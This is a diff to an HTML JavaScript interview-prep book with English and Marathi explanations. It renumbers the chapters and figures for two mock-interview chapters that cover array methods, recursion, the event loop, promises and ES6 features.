 <div class="part"><span class="part-no">PART 11</span>Mock Interviews<small>Real mock-interview questions · coding tasks · output questions · theory answers</small></div>
 
-<!-- ============================ CHAPTER 92 ============================ -->
-<div class="chapter">Chapter 92: Mock Interview I: Coding Tasks &amp; Core Q&amp;A<small>mock-interview/interview.js (part 1) · students array tasks · factorial · reverse · array &amp; string methods · deep clone · event loop · async functions · typeof</small></div>
-<div class="toc"><b>CHAPTER 92 INDEX</b>
+<!-- ============================ CHAPTER 97 ============================ -->
+<div class="chapter">Chapter 97: Mock Interview I: Coding Tasks &amp; Core Q&amp;A<small>mock-interview/interview.js (part 1) · students array tasks · factorial · reverse · array &amp; string methods · deep clone · event loop · async functions · typeof</small></div>
+<div class="toc"><b>CHAPTER 97 INDEX</b>
 <ol><li>Why the file doesn't run (read first)</li><li>Students array: map &amp; filter tasks</li><li>Factorial &amp; reverse a string</li><li>Function expression, spread &amp; rest</li><li>Array methods: concat, slice, fill, sort, some, find, every, splice, findIndex</li><li>String questions</li><li>Deep clone &amp; structuredClone()</li><li>Single thread, event loop &amp; runtime</li><li>Promise states without new Promise &amp; typeof questions</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Why the file doesn't run (read first)</h2>
@@ -32235,7 +33353,7 @@ console.log(reverseString1("hello"));   // output: "olleh"</pre>
 <g fill="#fff7e6" stroke="#f0a020"><rect x="380" y="138" width="220" height="26" rx="5"/><rect x="380" y="106" width="220" height="26" rx="5"/><rect x="380" y="74" width="220" height="26" rx="5"/><rect x="380" y="42" width="220" height="26" rx="5"/><rect x="380" y="10" width="220" height="26" rx="5"/></g>
 <text x="390" y="156">"" + "o" = "o"</text><text x="390" y="124">"o" + "l" = "ol"</text><text x="390" y="92">"ol" + "l" = "oll"</text><text x="390" y="60">"oll" + "e" = "olle"</text><text x="390" y="28">"olle" + "h" = "olleh" ✔</text>
 <text x="330" y="90" font-family="sans-serif" text-anchor="middle" fill="#555">calls go down</text><text x="330" y="106" font-family="sans-serif" text-anchor="middle" fill="#555">results come up ↑</text></g></svg>
-<div class="cap">Figure 157: Recursive string reverse: each call waits for the smaller string, then adds its first character at the end.</div></div>
+<div class="cap">Figure 165: Recursive string reverse: each call waits for the smaller string, then adds its first character at the end.</div></div>
 <div class="box mr">Recursion मध्ये function स्वतःला लहान input ने call करतो आणि base case ("" किंवा 0) ला थांबतो. Factorial मध्ये negative number दिला तर base case कधीच येत नाही आणि stack overflow होतो.</div>
 
 <h2>4. Function expression, spread &amp; rest</h2>
@@ -32571,7 +33689,7 @@ console.log(typeof arr4);        // object</pre>
 <line x1="170" y1="58" x2="420" y2="30" stroke="#27ae60" stroke-width="2"/><line x1="170" y1="72" x2="420" y2="100" stroke="#c0392b" stroke-width="2"/>
 <text x="290" y="34" text-anchor="middle" font-size="11">async fn returns a value</text><text x="290" y="112" text-anchor="middle" font-size="11">async fn throws</text>
 <text x="95" y="108" text-anchor="middle" font-size="11" fill="#555">awaits a never-settling promise</text><text x="95" y="122" text-anchor="middle" font-size="11" fill="#555">→ stays pending</text></g></svg>
-<div class="cap">Figure 158: An async function's promise: return → fulfilled, throw → rejected, never settling → pending.</div></div>
+<div class="cap">Figure 166: An async function's promise: return → fulfilled, throw → rejected, never settling → pending.</div></div>
 <div class="box mr">async function नेहमी promise देतो: value return केली तर fulfilled, error throw केला तर rejected, आणि कधीच settle न होणाऱ्या promise ची वाट पाहिली तर pending. typeof class आणि typeof function दोन्ही "function" देतात, typeof [] "object" देतो.</div>
 
 <h2>10. Interview Questions &amp; Revision</h2>
@@ -32599,11 +33717,11 @@ console.log(typeof class {}, typeof [], typeof null);     // → function object
 <tr><td>Promise states</td><td>pending → fulfilled / rejected</td></tr></table>
 <div class="box mr">थोडक्यात: interview मध्ये map/filter, recursion, array methods (कोणते मूळ array बदलतात), string methods आणि event loop हे विषय नेहमी येतात. प्रत्येक उत्तर वेगळ्या file मध्ये चालवून output स्वतः तपासा.</div>
 
-<!-- ===== END OF CHAPTER 92 ===== -->
+<!-- ===== END OF CHAPTER 97 ===== -->
 
-<!-- ============================ CHAPTER 93 ============================ -->
-<div class="chapter">Chapter 93: Mock Interview II: Output Questions, Async &amp; ES6<small>mock-interview/interview.js (part 2) · mock interview 1 (21/01/2025) · mock interview 2 · output questions · object keys · promises on button click · top-level await · ES5 vs ES6</small></div>
-<div class="toc"><b>CHAPTER 93 INDEX</b>
+<!-- ============================ CHAPTER 98 ============================ -->
+<div class="chapter">Chapter 98: Mock Interview II: Output Questions, Async &amp; ES6<small>mock-interview/interview.js (part 2) · mock interview 1 (21/01/2025) · mock interview 2 · output questions · object keys · promises on button click · top-level await · ES5 vs ES6</small></div>
+<div class="toc"><b>CHAPTER 98 INDEX</b>
 <ol><li>Mock interview 1: output questions</li><li>Objects as keys &amp; string interleaving</li><li>Mock interview 2: arrays, currying, copies, theory</li><li>Pure/impure functions &amp; transpiling</li><li>ES6 features</li><li>Promises on button click &amp; await outside async</li><li>Students marks: map, filter, reduce chains</li><li>Multiple APIs &amp; ways to handle async</li><li>Single thread, DOM, ES5 vs ES6</li><li>Interview Questions &amp; Revision</li></ol></div>
 
 <h2>1. Mock interview 1: output questions</h2>
@@ -32755,7 +33873,7 @@ console.log(b[c]); // 700 */</pre>
 <rect x="230" y="45" width="170" height="36" rx="6" fill="#fff7e6" stroke="#f0a020"/><text x="315" y="62" text-anchor="middle" font-size="12">String(obj) →</text><text x="315" y="76" text-anchor="middle" font-size="12" font-family="monospace">"[object Object]"</text>
 <line x1="400" y1="63" x2="450" y2="63" stroke="#555"/>
 <rect x="450" y="35" width="180" height="56" rx="6" fill="#e9f7ef" stroke="#27ae60"/><text x="540" y="58" text-anchor="middle" font-family="monospace" font-size="12">a = { "[object Object]":</text><text x="540" y="78" text-anchor="middle" font-family="monospace" font-size="12">600 }  → a[c] = 600</text></g></svg>
-<div class="cap">Figure 159: Every plain object used as a key becomes the same string "[object Object]", so a[b] and a[c] are the same slot.</div></div>
+<div class="cap">Figure 167: Every plain object used as a key becomes the same string "[object Object]", so a[b] and a[c] are the same slot.</div></div>
 <div class="box mine"><div class="code-title">? for the following example I want this output</div>
 <pre>// ? for the following example I want this output
 let str = 'abcdef';
@@ -32933,7 +34051,7 @@ Transpilers allow developers to write code in a more expressive, efficient, or h
 <li>Number.isFinite() and Number.isNaN(): improved number checking methods.</li>
 <li>Generators (function*): create iterators with the yield keyword (function* gen() { yield 1; yield 2; }).</li>
 <li>WeakMap and WeakSet: similar to Map and Set, but with weak references.</li></ol>
-<span class="cn">✔ (1) const is not "immutable": the BINDING can't be reassigned, but a const object/array can still be changed (const a = []; a.push(1) works). (2) Object.entries()/Object.values() are ES2017 and Array.prototype.includes() is ES2016, not ES6. Spread for OBJECTS ({...obj}) is ES2018; ES6 had array spread. (3) The second copy of the list was numbered 1–18 and then the last 2 items had no numbers. See Chapter 84 for features by version.</span><span class="cnm">const म्हणजे पुन्हा assign करता येत नाही, पण object आतून बदलता येतो. Object.entries/values ES2017, includes ES2016, object spread ES2018 मध्ये आले, ES6 मध्ये नाही.</span></div>
+<span class="cn">✔ (1) const is not "immutable": the BINDING can't be reassigned, but a const object/array can still be changed (const a = []; a.push(1) works). (2) Object.entries()/Object.values() are ES2017 and Array.prototype.includes() is ES2016, not ES6. Spread for OBJECTS ({...obj}) is ES2018; ES6 had array spread. (3) The second copy of the list was numbered 1–18 and then the last 2 items had no numbers. See Chapter 87 for features by version.</span><span class="cnm">const म्हणजे पुन्हा assign करता येत नाही, पण object आतून बदलता येतो. Object.entries/values ES2017, includes ES2016, object spread ES2018 मध्ये आले, ES6 मध्ये नाही.</span></div>
 
 <h2>6. Promises on button click &amp; await outside async</h2>
 <div class="box mine"><b>? What is a promise and its states?</b> Promises are objects or placeholders where we store the failure or success of an asynchronous operation. A promise has 3 states: the pending state, the fulfilled state, the rejected state.
@@ -33107,7 +34225,7 @@ console.log(totalMark)   // → 231 (87 + 76 + 68; Charlie 35 + 20 = 55 is still
 <text x="567" y="62" text-anchor="middle" font-weight="bold">reduce (sum)</text><text x="567" y="82" text-anchor="middle">231</text>
 <g stroke="#555"><line x1="140" y1="70" x2="175" y2="70"/><line x1="305" y1="70" x2="340" y2="70"/><line x1="470" y1="70" x2="505" y2="70"/></g>
 <text x="320" y="122" text-anchor="middle" fill="#c0392b">mutating ele.marks inside map also changes the original array: copy with { ...ele }</text></g></svg>
-<div class="cap">Figure 160: The map → filter → reduce chain for the marks question, step by step.</div></div>
+<div class="cap">Figure 168: The map → filter → reduce chain for the marks question, step by step.</div></div>
 <div class="box mine"><div class="code-title">create a promise that resolves or rejects when I click a button</div>
 <pre>// # create a promise that resolves or rejects when I click a button
 let btn1 = document.getElementById('btn1')
@@ -33282,7 +34400,7 @@ console.log([87, 35].map(m =&gt; m &lt; 60 ? m + 20 : m).filter(m =&gt; m &gt; 6
 <tr><td>ES6 vs later</td><td>includes ES2016, Object.entries ES2017, object spread ES2018</td></tr></table>
 <div class="box mr">थोडक्यात: output प्रश्नांमध्ये type coercion (false * 12 = 0), reference comparison ({} == {} false), object keys ("[object Object]") आणि async return/throw हे मुद्दे नेहमी येतात. map मध्ये मूळ object बदलू नका, आणि async मधून reject करायला throw वापरा.</div>
 
-<!-- ===== END OF CHAPTER 93 ===== -->
+<!-- ===== END OF CHAPTER 98 ===== -->
 
 <!-- PART-END 11: Mock Interviews (add new chapters of this part above this line) -->
 
